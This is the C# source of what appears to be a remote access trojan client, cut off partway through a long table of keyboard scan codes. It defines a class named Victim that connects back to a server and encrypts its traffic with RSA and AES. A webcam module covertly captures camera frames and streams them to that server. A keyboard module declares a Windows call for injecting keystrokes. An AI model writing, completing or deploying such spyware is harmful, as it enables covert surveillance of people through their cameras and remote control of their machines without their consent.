using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Management;
using System.Net.NetworkInformation;
using Microsoft.Win32;
using System.IO.Compression;

namespace client48
{
    internal class Program
    {
        //--------------[ COMMUNICATION | START ]--------------\\

        internal class DSP
        {
            //HEADER
            public const int HEADER_SIZE = 6; //6 BYTES
            public byte _Command = 0;
            public byte Command { get { return _Command; } }
            public byte _Param = 0;
            public byte Param { get { return _Param; } }
            private int _DataLength = 0;
            public int DataLength { get { return _DataLength; } }

            //DATA
            private byte[] _MessageData = new byte[0];
            private byte[] MessageData = new byte[0];
            private byte[] _MoreData = new byte[0];
            public byte[] MoreData { get { return _MoreData; } }

            //CONSTRUCTOR-1
            public DSP(byte[] buffer)
            {
                if (buffer == null || buffer.Length < HEADER_SIZE)
                    return;

                //BUFFER INFORMATION
                using (MemoryStream ms = new MemoryStream(buffer))
                {
                    using (BinaryReader br = new BinaryReader(ms))
                    {
                        try
                        {
                            //HEADER
                            _Command = br.ReadByte(); // 1 BYTE
                            _Param = br.ReadByte(); // 1 BYTE
                            _DataLength = br.ReadInt32(); // READ 4 BYTES

                            if (buffer.Length - HEADER_SIZE >= DataLength)
                                _MessageData = br.ReadBytes(_DataLength);
                            if (buffer.Length - HEADER_SIZE - DataLength > 0)
                                _MoreData = br.ReadBytes(buffer.Length - HEADER_SIZE - _DataLength);
                        }
                        catch (Exception ex)
                        {

                        }
                    }
                }
            }
            //CONSTRUCTOR-2
            public DSP(byte cmd, byte para, byte[] msg)
            {
                _Command = cmd;
                _Param = para;
                _MessageData = msg;
                _DataLength = msg.Length;
            }

            public byte[] GetBytes()
            {
                try
                {
                    byte[] bytes = null;
                    MemoryStream ms = new MemoryStream();
                    BinaryWriter bw = new BinaryWriter(ms);
                    bw.Write(_Command);
                    bw.Write(_Param);
                    bw.Write(_DataLength);
                    bw.Write(_MessageData);
                    bytes = ms.ToArray();
                    bw.Close();
                    ms.Close();

                    return bytes;
                }
                catch (Exception ex)
                {
                    return new byte[0];
                }
            }

            public (byte cmd, byte para, int len, byte[] msg) GetMsg()
            {
                (byte cmd, byte para, int len, byte[] msg) ret = (
                    _Command,
                    _Param,
                    _MessageData.Length,
                    _MessageData
                    );

                return ret;
            }

            public static (byte cmd, byte para, int len) GetHeader(byte[] buf)
            {
                (byte cmd, byte para, int len) ret = (0, 0, 0);
                if (buf == null || buf.Length < HEADER_SIZE)
                    return ret;

                ret.cmd = buf[0];
                ret.para = buf[1];
                ret.len = BitConverter.ToInt32(buf, 2);

                return ret;
            }
        }
        internal class Victim
        {
            public Socket socket;
            public static int MAX_BUFFER_LENGTH = 65536;
            public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
            public string server_ip;
            public int server_port;

            //CRYPTOGRAPHY
            public (string public_key, string private_key) key_pairs;
            public (byte[] key, byte[] iv) _AES;

            byte[] Compress(byte[] buffer)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress))
                    {
                        gzip.Write(buffer, 0, buffer.Length);
                    }
                    return ms.ToArray();
                }
            }
            public Victim(Socket socket)
            {
                this.socket = socket;
            }

            public void Send(int cmd, int param, byte[] msg)
            {
                if (msg != null)
                {
                    byte[] buffer = new DSP((byte)cmd, (byte)param, msg).GetBytes();
                    //buffer = Compress(buffer);
                    socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.Partial, new AsyncCallback((ar) =>
                    {
                        try
                        {
                            socket.EndSend(ar);
                        }
                        catch (Exception ex)
                        {

                        }
                    }), buffer);
                }
            }
            public void Send(int cmd, int param, string msg)
            {
                Send(cmd, param, Encoding.UTF8.GetBytes(msg));
            }
            public void encSend(int cmd, int param, string data)
            {
                string enc_data = Crypto.AESEncrypt(data, _AES.key, _AES.iv);
                Send(cmd, param, enc_data);
            }
        }
        internal class Crypto
        {
            static int rsa_keySize = 4096;
            static int aes_keySize = 256;
            static int block_size = 128;

            public static string[] CreateRSAKey()
            {
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.KeySize = rsa_keySize;

                string publicKey = rsa.ToXmlString(false);
                string privateKey = rsa.ToXmlString(true);

                return new string[] { publicKey, privateKey };
            }
            public static byte[] RSAEncrypt(string data, string publicKey)
            {
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.KeySize = rsa_keySize;
                rsa.FromXmlString(publicKey);

                byte[] eVal = rsa.Encrypt(Encoding.UTF8.GetBytes(data), false);

                return eVal;
            }
            public static byte[] RSADecrypt(byte[] data, string privateKey)
            {
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.KeySize = rsa_keySize;
                rsa.FromXmlString(privateKey);

                byte[] dVal = rsa.Decrypt(data, false);
                return dVal;
            }

            public static string AESEncrypt(string plain_text, byte[] key, byte[] iv)
            {
                byte[] cipher_bytes = null;
                using (Aes aes = Aes.Create())
                {
                    aes.Mode = CipherMode.CBC;
                    aes.KeySize = aes_keySize;
                    aes.BlockSize = block_size;
                    aes.Key = key;
                    aes.IV = iv;

                    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                        {
                            using (StreamWriter sw = new StreamWriter(cs))
                            {
                                sw.Write(plain_text);
                            }
                            cipher_bytes = ms.ToArray();
                        }
                    }
                }

                return Convert.ToBase64String(cipher_bytes);
            }
            public static string AESDecrypt(byte[] cipher_bytes, byte[] key, byte[] iv)
            {
                string plain_text = null;
                using (Aes aes = Aes.Create())
                {
                    aes.Mode = CipherMode.CBC;
                    aes.KeySize = aes_keySize;
                    aes.BlockSize = block_size;
                    aes.Key = key;
                    aes.IV = iv;

                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                    using (MemoryStream ms = new MemoryStream(cipher_bytes))
                    {
                        using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader sr = new StreamReader(cs))
                            {
                                plain_text = sr.ReadToEnd();
                            }
                        }
                    }
                }


                return plain_text;
            }
            public static (string key, string iv) AES_GenerateKeyAndIV()
            {
                string key = null;
                string iv = null;
                using (Aes aes = Aes.Create())
                {
                    aes.KeySize = 256;
                    aes.GenerateKey();
                    aes.GenerateIV();

                    key = b64E2Str(aes.Key);
                    iv = b64E2Str(aes.IV);
                }

                return (key, iv);
            }

            public static string b64E2Str(string data) { return Convert.ToBase64String(Encoding.UTF8.GetBytes(data)); }
            public static string b64E2Str(byte[] data) { return Convert.ToBase64String(data); }
            public static byte[] b64E2Bytes(string data) { return Encoding.UTF8.GetBytes(b64E2Str(data)); }
            public static byte[] b64E2Bytes(byte[] data) { return Encoding.UTF8.GetBytes(b64E2Str(data)); }
            public static string b64D2Str(string data) { return Encoding.UTF8.GetString(Convert.FromBase64String(data)); }
            public static string b64D2Str(byte[] data) { return Encoding.UTF8.GetString(data); }
            public static byte[] b64D2Bytes(string data) { return Convert.FromBase64String(data); }
            public static byte[] b64D2Bytes(byte[] data) { return b64D2Bytes(Encoding.UTF8.GetString(data)); }
        }

        //--------------[ COMMUNICATION | END ]--------------\\

        //--------------[ CLIENT FUNCTION | START ]--------------\\

        internal class Webcam
        {
            private FilterInfoCollection videoDevices;
            private VideoCaptureDevice videoSource;
            private Bitmap currentFrame;
            public bool stop_capture = false;
            public bool is_stopped = true;
            public bool snapshot = false;
            public Victim v;

            public string GetDevices()
            {
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                List<string> device_list = new List<string>();
                if (videoDevices.Count > 0)
                    for (int i = 0; i < videoDevices.Count; i++)
                        device_list.Add(videoDevices[i].Name);

                return string.Join(",", device_list.ToArray());
            }
            public void StartCapture(int index)
            {
                // Get available video devices
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                if (videoDevices.Count == 0)
                {
                    Console.WriteLine("No video capture devices found.");
                    return;
                }

                // Use the first available video device
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);

                // Start capturing
                is_stopped = false;
                videoSource.Start();

                while (!stop_capture)
                    Thread.Sleep(10);

                // Wait for user input to stop
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                is_stopped = true;
            }
            private void videoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
            {
                // Save the current frame as a Bitmap
                currentFrame = (Bitmap)eventArgs.Frame.Clone();

                // Save the image to disk
                //SaveImage("captured_image.jpg");

                // Convert the image to Base64 and print it
                string base64Image = ConvertImageToBase64(currentFrame);

                if (v != null)
                {
                    v.encSend(2, 0, "webcam|start|" + base64Image);
                }

                stop_capture = snapshot;
            }
            private void SaveImage(string filePath)
            {
                // Save the captured frame (currentFrame) to a file
                if (currentFrame != null)
                {
                    currentFrame.Save(filePath, System.Drawing.Imaging.ImageFormat.Jpeg);
                    Console.WriteLine($"Image saved to {filePath}");
                }
            }
            private string ConvertImageToBase64(Bitmap image)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    // Save the image to the memory stream in JPEG format
                    image.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);

                    // Convert the memory stream to a byte array
                    byte[] imageBytes = ms.ToArray();

                    // Convert the byte array to a Base64 string
                    return Convert.ToBase64String(imageBytes);
                }
            }
        }
        internal class Keyboard
        {
            public void SendInputWithAPI(ScanCodeShort key)
            {
                INPUT[] Inputs = new INPUT[4];
                INPUT Input = new INPUT();

                Input.type = 1; // 1 = Keyboard Input
                Input.U.ki.wScan = key;
                Input.U.ki.dwFlags = KEYEVENTF.SCANCODE;
                Inputs[0] = Input;

                SendInput(4, Inputs, INPUT.Size);
            }

            /// <summary>
            /// Declaration of external SendInput method
            /// </summary>
            [DllImport("user32.dll")]
            internal static extern uint SendInput(
                uint nInputs,
                [MarshalAs(UnmanagedType.LPArray), In] INPUT[] pInputs,
                int cbSize);


            // Declare the INPUT struct
            [StructLayout(LayoutKind.Sequential)]
            public struct INPUT
            {
                internal uint type;
                internal InputUnion U;
                internal static int Size
                {
                    get { return Marshal.SizeOf(typeof(INPUT)); }
                }
            }

            // Declare the InputUnion struct
            [StructLayout(LayoutKind.Explicit)]
            internal struct InputUnion
            {
                [FieldOffset(0)]
                internal MOUSEINPUT mi;
                [FieldOffset(0)]
                internal KEYBDINPUT ki;
                [FieldOffset(0)]
                internal HARDWAREINPUT hi;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct MOUSEINPUT
            {
                internal int dx;
                internal int dy;
                internal MouseEventDataXButtons mouseData;
                internal MOUSEEVENTF dwFlags;
                internal uint time;
                internal UIntPtr dwExtraInfo;
            }

            [Flags]
            internal enum MouseEventDataXButtons : uint
            {
                Nothing = 0x00000000,
                XBUTTON1 = 0x00000001,
                XBUTTON2 = 0x00000002
            }

            [Flags]
            internal enum MOUSEEVENTF : uint
            {
                ABSOLUTE = 0x8000,
                HWHEEL = 0x01000,
                MOVE = 0x0001,
                MOVE_NOCOALESCE = 0x2000,
                LEFTDOWN = 0x0002,
                LEFTUP = 0x0004,
                RIGHTDOWN = 0x0008,
                RIGHTUP = 0x0010,
                MIDDLEDOWN = 0x0020,
                MIDDLEUP = 0x0040,
                VIRTUALDESK = 0x4000,
                WHEEL = 0x0800,
                XDOWN = 0x0080,
                XUP = 0x0100
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct KEYBDINPUT
            {
                internal VirtualKeyShort wVk;
                internal ScanCodeShort wScan;
                internal KEYEVENTF dwFlags;
                internal int time;
                internal UIntPtr dwExtraInfo;
            }

            [Flags]
            internal enum KEYEVENTF : uint
            {
                EXTENDEDKEY = 0x0001,
                KEYUP = 0x0002,
                SCANCODE = 0x0008,
                UNICODE = 0x0004
            }

            internal enum VirtualKeyShort : short
            {
                ///<summary>
                ///Left mouse button
                ///</summary>
                LBUTTON = 0x01,
                ///<summary>
                ///Right mouse button
                ///</summary>
                RBUTTON = 0x02,
                ///<summary>
                ///Control-break processing
                ///</summary>
                CANCEL = 0x03,
                ///<summary>
                ///Middle mouse button (three-button mouse)
                ///</summary>
                MBUTTON = 0x04,
                ///<summary>
                ///Windows 2000/XP: X1 mouse button
                ///</summary>
                XBUTTON1 = 0x05,
                ///<summary>
                ///Windows 2000/XP: X2 mouse button
                ///</summary>
                XBUTTON2 = 0x06,
                ///<summary>
                ///BACKSPACE key
                ///</summary>
                BACK = 0x08,
                ///<summary>
                ///TAB key
                ///</summary>
                TAB = 0x09,
                ///<summary>
                ///CLEAR key
                ///</summary>
                CLEAR = 0x0C,
                ///<summary>
                ///ENTER key
                ///</summary>
                RETURN = 0x0D,
                ///<summary>
                ///SHIFT key
                ///</summary>
                SHIFT = 0x10,
                ///<summary>
                ///CTRL key
                ///</summary>
                CONTROL = 0x11,
                ///<summary>
                ///ALT key
                ///</summary>
                MENU = 0x12,
                ///<summary>
                ///PAUSE key
                ///</summary>
                PAUSE = 0x13,
                ///<summary>
                ///CAPS LOCK key
                ///</summary>
                CAPITAL = 0x14,
                ///<summary>
                ///Input Method Editor (IME) Kana mode
                ///</summary>
                KANA = 0x15,
                ///<summary>
                ///IME Hangul mode
                ///</summary>
                HANGUL = 0x15,
                ///<summary>
                ///IME Junja mode
                ///</summary>
                JUNJA = 0x17,
                ///<summary>
                ///IME final mode
                ///</summary>
                FINAL = 0x18,
                ///<summary>
                ///IME Hanja mode
                ///</summary>
                HANJA = 0x19,
                ///<summary>
                ///IME Kanji mode
                ///</summary>
                KANJI = 0x19,
                ///<summary>
                ///ESC key
                ///</summary>
                ESCAPE = 0x1B,
                ///<summary>
                ///IME convert
                ///</summary>
                CONVERT = 0x1C,
                ///<summary>
                ///IME nonconvert
                ///</summary>
                NONCONVERT = 0x1D,
                ///<summary>
                ///IME accept
                ///</summary>
                ACCEPT = 0x1E,
                ///<summary>
                ///IME mode change request
                ///</summary>
                MODECHANGE = 0x1F,
                ///<summary>
                ///SPACEBAR
                ///</summary>
                SPACE = 0x20,
                ///<summary>
                ///PAGE UP key
                ///</summary>
                PRIOR = 0x21,
                ///<summary>
                ///PAGE DOWN key
                ///</summary>
                NEXT = 0x22,
                ///<summary>
                ///END key
                ///</summary>
                END = 0x23,
                ///<summary>
                ///HOME key
                ///</summary>
                HOME = 0x24,
                ///<summary>
                ///LEFT ARROW key
                ///</summary>
                LEFT = 0x25,
                ///<summary>
                ///UP ARROW key
                ///</summary>
                UP = 0x26,
                ///<summary>
                ///RIGHT ARROW key
                ///</summary>
                RIGHT = 0x27,
                ///<summary>
                ///DOWN ARROW key
                ///</summary>
                DOWN = 0x28,
                ///<summary>
                ///SELECT key
                ///</summary>
                SELECT = 0x29,
                ///<summary>
                ///PRINT key
                ///</summary>
                PRINT = 0x2A,
                ///<summary>
                ///EXECUTE key
                ///</summary>
                EXECUTE = 0x2B,
                ///<summary>
                ///PRINT SCREEN key
                ///</summary>
                SNAPSHOT = 0x2C,
                ///<summary>
                ///INS key
                ///</summary>
                INSERT = 0x2D,
                ///<summary>
                ///DEL key
                ///</summary>
                DELETE = 0x2E,
                ///<summary>
                ///HELP key
                ///</summary>
                HELP = 0x2F,
                ///<summary>
                ///0 key
                ///</summary>
                KEY_0 = 0x30,
                ///<summary>
                ///1 key
                ///</summary>
                KEY_1 = 0x31,
                ///<summary>
                ///2 key
                ///</summary>
                KEY_2 = 0x32,
                ///<summary>
                ///3 key
                ///</summary>
                KEY_3 = 0x33,
                ///<summary>
                ///4 key
                ///</summary>
                KEY_4 = 0x34,
                ///<summary>
                ///5 key
                ///</summary>
                KEY_5 = 0x35,
                ///<summary>
                ///6 key
                ///</summary>
                KEY_6 = 0x36,
                ///<summary>
                ///7 key
                ///</summary>
                KEY_7 = 0x37,
                ///<summary>
                ///8 key
                ///</summary>
                KEY_8 = 0x38,
                ///<summary>
                ///9 key
                ///</summary>
                KEY_9 = 0x39,
                ///<summary>
                ///A key
                ///</summary>
                KEY_A = 0x41,
                ///<summary>
                ///B key
                ///</summary>
                KEY_B = 0x42,
                ///<summary>
                ///C key
                ///</summary>
                KEY_C = 0x43,
                ///<summary>
                ///D key
                ///</summary>
                KEY_D = 0x44,
                ///<summary>
                ///E key
                ///</summary>
                KEY_E = 0x45,
                ///<summary>
                ///F key
                ///</summary>
                KEY_F = 0x46,
                ///<summary>
                ///G key
                ///</summary>
                KEY_G = 0x47,
                ///<summary>
                ///H key
                ///</summary>
                KEY_H = 0x48,
                ///<summary>
                ///I key
                ///</summary>
                KEY_I = 0x49,
                ///<summary>
                ///J key
                ///</summary>
                KEY_J = 0x4A,
                ///<summary>
                ///K key
                ///</summary>
                KEY_K = 0x4B,
                ///<summary>
                ///L key
                ///</summary>
                KEY_L = 0x4C,
                ///<summary>
                ///M key
                ///</summary>
                KEY_M = 0x4D,
                ///<summary>
                ///N key
                ///</summary>
                KEY_N = 0x4E,
                ///<summary>
                ///O key
                ///</summary>
                KEY_O = 0x4F,
                ///<summary>
                ///P key
                ///</summary>
                KEY_P = 0x50,
                ///<summary>
                ///Q key
                ///</summary>
                KEY_Q = 0x51,
                ///<summary>
                ///R key
                ///</summary>
                KEY_R = 0x52,
                ///<summary>
                ///S key
                ///</summary>
                KEY_S = 0x53,
                ///<summary>
                ///T key
                ///</summary>
                KEY_T = 0x54,
                ///<summary>
                ///U key
                ///</summary>
                KEY_U = 0x55,
                ///<summary>
                ///V key
                ///</summary>
                KEY_V = 0x56,
                ///<summary>
                ///W key
                ///</summary>
                KEY_W = 0x57,
                ///<summary>
                ///X key
                ///</summary>
                KEY_X = 0x58,
                ///<summary>
                ///Y key
                ///</summary>
                KEY_Y = 0x59,
                ///<summary>
                ///Z key
                ///</summary>
                KEY_Z = 0x5A,
                ///<summary>
                ///Left Windows key (Microsoft Natural keyboard) 
                ///</summary>
                LWIN = 0x5B,
                ///<summary>
                ///Right Windows key (Natural keyboard)
                ///</summary>
                RWIN = 0x5C,
                ///<summary>
                ///Applications key (Natural keyboard)
                ///</summary>
                APPS = 0x5D,
                ///<summary>
                ///Computer Sleep key
                ///</summary>
                SLEEP = 0x5F,
                ///<summary>
                ///Numeric keypad 0 key
                ///</summary>
                NUMPAD0 = 0x60,
                ///<summary>
                ///Numeric keypad 1 key
                ///</summary>
                NUMPAD1 = 0x61,
                ///<summary>
                ///Numeric keypad 2 key
                ///</summary>
                NUMPAD2 = 0x62,
                ///<summary>
                ///Numeric keypad 3 key
                ///</summary>
                NUMPAD3 = 0x63,
                ///<summary>
                ///Numeric keypad 4 key
                ///</summary>
                NUMPAD4 = 0x64,
                ///<summary>
                ///Numeric keypad 5 key
                ///</summary>
                NUMPAD5 = 0x65,
                ///<summary>
                ///Numeric keypad 6 key
                ///</summary>
                NUMPAD6 = 0x66,
                ///<summary>
                ///Numeric keypad 7 key
                ///</summary>
                NUMPAD7 = 0x67,
                ///<summary>
                ///Numeric keypad 8 key
                ///</summary>
                NUMPAD8 = 0x68,
                ///<summary>
                ///Numeric keypad 9 key
                ///</summary>
                NUMPAD9 = 0x69,
                ///<summary>
                ///Multiply key
                ///</summary>
                MULTIPLY = 0x6A,
                ///<summary>
                ///Add key
                ///</summary>
                ADD = 0x6B,
                ///<summary>
                ///Separator key
                ///</summary>
                SEPARATOR = 0x6C,
                ///<summary>
                ///Subtract key
                ///</summary>
                SUBTRACT = 0x6D,
                ///<summary>
                ///Decimal key
                ///</summary>
                DECIMAL = 0x6E,
                ///<summary>
                ///Divide key
                ///</summary>
                DIVIDE = 0x6F,
                ///<summary>
                ///F1 key
                ///</summary>
                F1 = 0x70,
                ///<summary>
                ///F2 key
                ///</summary>
                F2 = 0x71,
                ///<summary>
                ///F3 key
                ///</summary>
                F3 = 0x72,
                ///<summary>
                ///F4 key
                ///</summary>
                F4 = 0x73,
                ///<summary>
                ///F5 key
                ///</summary>
                F5 = 0x74,
                ///<summary>
                ///F6 key
                ///</summary>
                F6 = 0x75,
                ///<summary>
                ///F7 key
                ///</summary>
                F7 = 0x76,
                ///<summary>
                ///F8 key
                ///</summary>
                F8 = 0x77,
                ///<summary>
                ///F9 key
                ///</summary>
                F9 = 0x78,
                ///<summary>
                ///F10 key
                ///</summary>
                F10 = 0x79,
                ///<summary>
                ///F11 key
                ///</summary>
                F11 = 0x7A,
                ///<summary>
                ///F12 key
                ///</summary>
                F12 = 0x7B,
                ///<summary>
                ///F13 key
                ///</summary>
                F13 = 0x7C,
                ///<summary>
                ///F14 key
                ///</summary>
                F14 = 0x7D,
                ///<summary>
                ///F15 key
                ///</summary>
                F15 = 0x7E,
                ///<summary>
                ///F16 key
                ///</summary>
                F16 = 0x7F,
                ///<summary>
                ///F17 key  
                ///</summary>
                F17 = 0x80,
                ///<summary>
                ///F18 key  
                ///</summary>
                F18 = 0x81,
                ///<summary>
                ///F19 key  
                ///</summary>
                F19 = 0x82,
                ///<summary>
                ///F20 key  
                ///</summary>
                F20 = 0x83,
                ///<summary>
                ///F21 key  
                ///</summary>
                F21 = 0x84,
                ///<summary>
                ///F22 key, (PPC only) Key used to lock device.
                ///</summary>
                F22 = 0x85,
                ///<summary>
                ///F23 key  
                ///</summary>
                F23 = 0x86,
                ///<summary>
                ///F24 key  
                ///</summary>
                F24 = 0x87,
                ///<summary>
                ///NUM LOCK key
                ///</summary>
                NUMLOCK = 0x90,
                ///<summary>
                ///SCROLL LOCK key
                ///</summary>
                SCROLL = 0x91,
                ///<summary>
                ///Left SHIFT key
                ///</summary>
                LSHIFT = 0xA0,
                ///<summary>
                ///Right SHIFT key
                ///</summary>
                RSHIFT = 0xA1,
                ///<summary>
                ///Left CONTROL key
                ///</summary>
                LCONTROL = 0xA2,
                ///<summary>
                ///Right CONTROL key
                ///</summary>
                RCONTROL = 0xA3,
                ///<summary>
                ///Left MENU key
                ///</summary>
                LMENU = 0xA4,
                ///<summary>
                ///Right MENU key
                ///</summary>
                RMENU = 0xA5,
                ///<summary>
                ///Windows 2000/XP: Browser Back key
                ///</summary>
                BROWSER_BACK = 0xA6,
                ///<summary>
                ///Windows 2000/XP: Browser Forward key
                ///</summary>
                BROWSER_FORWARD = 0xA7,
                ///<summary>
                ///Windows 2000/XP: Browser Refresh key
                ///</summary>
                BROWSER_REFRESH = 0xA8,
                ///<summary>
                ///Windows 2000/XP: Browser Stop key
                ///</summary>
                BROWSER_STOP = 0xA9,
                ///<summary>
                ///Windows 2000/XP: Browser Search key 
                ///</summary>
                BROWSER_SEARCH = 0xAA,
                ///<summary>
                ///Windows 2000/XP: Browser Favorites key
                ///</summary>
                BROWSER_FAVORITES = 0xAB,
                ///<summary>
                ///Windows 2000/XP: Browser Start and Home key
                ///</summary>
                BROWSER_HOME = 0xAC,
                ///<summary>
                ///Windows 2000/XP: Volume Mute key
                ///</summary>
                VOLUME_MUTE = 0xAD,
                ///<summary>
                ///Windows 2000/XP: Volume Down key
                ///</summary>
                VOLUME_DOWN = 0xAE,
                ///<summary>
                ///Windows 2000/XP: Volume Up key
                ///</summary>
                VOLUME_UP = 0xAF,
                ///<summary>
                ///Windows 2000/XP: Next Track key
                ///</summary>
                MEDIA_NEXT_TRACK = 0xB0,
                ///<summary>
                ///Windows 2000/XP: Previous Track key
                ///</summary>
                MEDIA_PREV_TRACK = 0xB1,
                ///<summary>
                ///Windows 2000/XP: Stop Media key
                ///</summary>
                MEDIA_STOP = 0xB2,
                ///<summary>
                ///Windows 2000/XP: Play/Pause Media key
                ///</summary>
                MEDIA_PLAY_PAUSE = 0xB3,
                ///<summary>
                ///Windows 2000/XP: Start Mail key
                ///</summary>
                LAUNCH_MAIL = 0xB4,
                ///<summary>
                ///Windows 2000/XP: Select Media key
                ///</summary>
                LAUNCH_MEDIA_SELECT = 0xB5,
                ///<summary>
                ///Windows 2000/XP: Start Application 1 key
                ///</summary>
                LAUNCH_APP1 = 0xB6,
                ///<summary>
                ///Windows 2000/XP: Start Application 2 key
                ///</summary>
                LAUNCH_APP2 = 0xB7,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard.
                ///</summary>
                OEM_1 = 0xBA,
                ///<summary>
                ///Windows 2000/XP: For any country/region, the '+' key
                ///</summary>
                OEM_PLUS = 0xBB,
                ///<summary>
                ///Windows 2000/XP: For any country/region, the ',' key
                ///</summary>
                OEM_COMMA = 0xBC,
                ///<summary>
                ///Windows 2000/XP: For any country/region, the '-' key
                ///</summary>
                OEM_MINUS = 0xBD,
                ///<summary>
                ///Windows 2000/XP: For any country/region, the '.' key
                ///</summary>
                OEM_PERIOD = 0xBE,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard.
                ///</summary>
                OEM_2 = 0xBF,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard. 
                ///</summary>
                OEM_3 = 0xC0,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard. 
                ///</summary>
                OEM_4 = 0xDB,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard. 
                ///</summary>
                OEM_5 = 0xDC,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard. 
                ///</summary>
                OEM_6 = 0xDD,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard. 
                ///</summary>
                OEM_7 = 0xDE,
                ///<summary>
                ///Used for miscellaneous characters; it can vary by keyboard.
                ///</summary>
                OEM_8 = 0xDF,
                ///<summary>
                ///Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard
                ///</summary>
                OEM_102 = 0xE2,
                ///<summary>
                ///Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key
                ///</summary>
                PROCESSKEY = 0xE5,
                ///<summary>
                ///Windows 2000/XP: Used to pass Unicode characters as if they were keystrokes.
                ///The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information,
                ///see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP
                ///</summary>
                PACKET = 0xE7,
                ///<summary>
                ///Attn key
                ///</summary>
                ATTN = 0xF6,
                ///<summary>
                ///CrSel key
                ///</summary>
                CRSEL = 0xF7,
                ///<summary>
                ///ExSel key
                ///</summary>
                EXSEL = 0xF8,
                ///<summary>
                ///Erase EOF key
                ///</summary>
                EREOF = 0xF9,
                ///<summary>
                ///Play key
                ///</summary>
                PLAY = 0xFA,
                ///<summary>
                ///Zoom key
                ///</summary>
                ZOOM = 0xFB,
                ///<summary>
                ///Reserved 
                ///</summary>
                NONAME = 0xFC,
                ///<summary>
                ///PA1 key
                ///</summary>
                PA1 = 0xFD,
                ///<summary>
                ///Clear key
                ///</summary>
                OEM_CLEAR = 0xFE
            }

            public enum ScanCodeShort : short
            {
                LBUTTON = 0,
                RBUTTON = 0,
                CANCEL = 70,
                MBUTTON = 0,
                XBUTTON1 = 0,
                XBUTTON2 = 0,
                BACK = 14,
                TAB = 15,
                CLEAR = 76,
                RETURN = 28,
                SHIFT = 42,
                CONTROL = 29,
                MENU = 56,
                PAUSE = 0,
                CAPITAL = 58,
                KANA = 0,
                HANGUL = 0,
                JUNJA = 0,
                FINAL = 0,
                HANJA = 0,
                KANJI = 0,
                ESCAPE = 1,
                CONVERT = 0,
                NONCONVERT = 0,
                ACCEPT = 0,
                MODECHANGE = 0,
                SPACE = 57,
                PRIOR = 73,
                NEXT = 81,
                END = 79,
                HOME = 71,
                LEFT = 75,
                UP = 72,
                RIGHT = 77,
                DOWN = 80,
                SELECT = 0,
                PRINT = 0,
                EXECUTE = 0,
                SNAPSHOT = 84,
                INSERT = 82,
                DELETE = 83,
                HELP = 99,
                KEY_0 = 11,
                KEY_1 = 2,
                KEY_2 = 3,
                KEY_3 = 4,
                KEY_4 = 5,
                KEY_5 = 6,
                KEY_6 = 7,
                KEY_7 = 8,
                KEY_8 = 9,
                KEY_9 = 10,
                KEY_A = 30,
                KEY_B = 48,
                KEY_C = 46,
                KEY_D = 32,
                KEY_E = 18,
                KEY_F = 33,
                KEY_G = 34,
                KEY_H = 35,
                KEY_I = 23,
                KEY_J = 36,
                KEY_K = 37,
                KEY_L = 38,
                KEY_M = 50,
                KEY_N = 49,
                KEY_O = 24,
                KEY_P = 25,
                KEY_Q = 16,
                KEY_R = 19,
                KEY_S = 31,
                KEY_T = 20,
                KEY_U = 22,
                KEY_V = 47,
                KEY_W = 17,
                KEY_X = 45,
                KEY_Y = 21,
                KEY_Z = 44,
                LWIN = 91,
                RWIN = 92,
                APPS = 93,
                SLEEP = 95,
                NUMPAD0 = 82,
                NUMPAD1 = 79,
                NUMPAD2 = 80,
                NUMPAD3 = 81,
                NUMPAD4 = 75,
                NUMPAD5 = 76,
                NUMPAD6 = 77,
                NUMPAD7 = 71,
                NUMPAD8 = 72,
                NUMPAD9 = 73,
                MULTIPLY = 55,
                ADD = 78,
                SEPARATOR = 0,
                SUBTRACT = 74,
                DECIMAL = 83,
                DIVIDE = 53,
                F1 = 59,
                F2 = 60,
                F3 = 61,
                F4 = 62,
                F5 = 63,
                F6 = 64,
                F7 = 65,
                F8 = 66,
                F9 = 67,
                F10 = 68,
                F11 = 87,
                F12 = 88,
                F13 = 100,
                F14 = 101,
                F15 = 102,
                F16 = 103,
                F17 = 104,
                F18 = 105,
                F19 = 106,
                F20 = 107,
                F21 = 108,
                F22 = 109,
                F23 = 110,
                F24 = 118,
                NUMLOCK = 69,
                SCROLL = 70,
                LSHIFT = 42,
                RSHIFT = 54,
                LCONTROL = 29,
